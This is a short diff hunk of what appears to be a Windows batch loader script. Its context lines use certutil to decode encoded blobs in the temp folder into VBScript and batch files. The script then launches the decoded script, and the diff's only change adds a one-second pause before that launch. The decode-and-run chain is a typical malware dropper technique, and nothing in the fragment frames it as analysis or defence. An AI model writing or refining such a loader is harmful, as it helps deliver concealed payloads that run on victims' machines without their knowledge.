@@ -10,5 +10,6 @@ certutil -f -decode %TEMP%\basevbs %TEMP%\baseexe.vbs
 certutil -f -decode %TEMP%\basecode %TEMP%\baseexe.bat
 certutil -f -decode %TEMP%\basescreen %TEMP%\batscreen.bat
 certutil -f -decode %TEMP%\vbsscreen %TEMP%\vbsscreen.vbs
+timeout 1
 start %TEMP%\baseexe.vbs
 exit
